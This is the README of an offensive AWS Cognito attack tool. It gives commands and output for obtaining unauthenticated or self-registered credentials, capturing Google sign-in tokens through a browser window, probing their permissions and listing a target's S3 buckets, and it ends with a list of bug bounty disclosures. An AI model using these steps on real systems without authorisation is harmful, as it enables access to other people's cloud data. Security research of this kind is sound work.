# Hirogen

A federated identity attack tool for AWS Cognito.

## Quick Start:
Check for and recover unauthenticated credentials from Cognito User Pool:

```sh
hirogen get-unauthenticated us-west-2:ff6c3f28-fd22-402e-bee7-78b426522f99

[+] Credentials received. Your new identity is:
{
	...
}
```

Sometimes the Identity pool is set to block unauthenticated credentials
```sh
[*] Identity Pool exists, but unauthenticated credentials are not supported.
```

But that's OK! Check for and perform direct registration to Cognito User Pools:
```sh
hirogen check-clientid 3q47qusd82ot7nivggtl2ri6tf us-west-2_RXeMnFJo3
[+] This clientId allows direct registration!

hirogen register-user me@myema.il mYp@ssw0rd '{"phone":"+155551234567"}'
[+] Registration appears to have been successful. Subscriber: ff6c3f28-fd22-402e-bee7-78b426522f99
[*] You must validate your registration before you can log in. Use 'confirm-user' once you receive your code.
```

This means registration was successful, but that you need to verify your email. Check your email and get your verification code, and pass it to Hirogen:
```sh
hirogen confirm-user 123456
[+] Verification successful. You can now use 'login-user'
```

We'll now login and get creds for our user. Since we're using Cognito User pools, we specify 'cognito_idp' as the provider.
```sh
hirogen login-user ADMIN_SRP_AUTH
[+] Login successful.

hirogen hirogen get-credentials cognito_idp
[+] Credentials received. Your new identity is:
{
	...
}
```

## Support for multiple third-party identity providers

Hirogen can perform **page hollowing** to capture authentication tokens for Google Sign-in and Login with Amazon.

```sh
hirogen login-provider google 950667609206-oetjmj5buch3ekvjjd1mreptnaq3bjjp.apps.googleusercontent.com https://domain-with-google/sign-in.html
```

This pops open a Puppeteer browser window with a Google Sign-in prompt. After signing in, the window will close automatically, and you're ready to get credentials for this identity.

```
[+] Got google token

hirogen get-credentials google
[+] Credentials received. Your new identity is:
{
	...
}
```

## Using recovered credentials

Cool, you've got several ways to get the creds, but what do you do then?

For starters, try a quick permissions audit:
```sh
hirogen test-credentials cognito_idp
[-] ddb_ListTables
[-] ec2_DescribeInstances
[-] ec2_DescribeVPCEndpoints
[-] iam_ListRoles
[-] iam_ListUsers
[+] s3_ArbitaryWrite
[+] s3_ArbitraryListObjects
[+] s3_ArbitraryRead
[+] s3_ListBuckets
```

Looks like we have read, write, listObjects, and listBuckets! Let's inspect it! Using 'hirogen as <provider> <awscli commands...>' to pipe the credentials to the AWS CLI.
```sh
hirogen as cognito_idp s3 ls
2019-02-19 17:15:14 202-backup
2019-04-15 13:39:10 aws-training
2016-09-16 09:24:14 bio.myresume.com
2017-03-18 11:49:54 breakingbad
2017-06-11 20:53:18 callmemaybe
2016-09-15 16:18:41 dayinthelife-prod
2017-10-26 01:51:00 devpipeline-cicd
```

```sh
hirogen as cognito_idp s3 ls 202-backup
                 PRE server-backup/
```

## Bug Bounties & Kudos

* A major manufacturer website exposed customer data: $3,000 paid
* A reputation management company exposed customer data, with writeable CI/CD pipeline and static site assets: Kudos
* A lifestyle and media company front-end Kubernetes cluster was accessible: Kudos
* A restaurant franchise website's static assets were modifiable: Kudos
* A staffing agency exposed applicant resumes: Kudos
* A gaming enthusiast website's static assets and leaderboards were modifiable: Kudos
* A celebrity's personal website allowed read-write to videos in s3: Kudos
* A psychology organization exposed training and example materials to self-registered cognito users: Kudos
* An AWS account belonging to an individual granted AdministratorAccess to self-registered Cognito users: Fixed, unacknowledged
* A clothing designer exposed order and customer information with modifiable CI/CD pipeline assets: Fixed, unacknowledged


Dozens of others have been notified but have not responded.
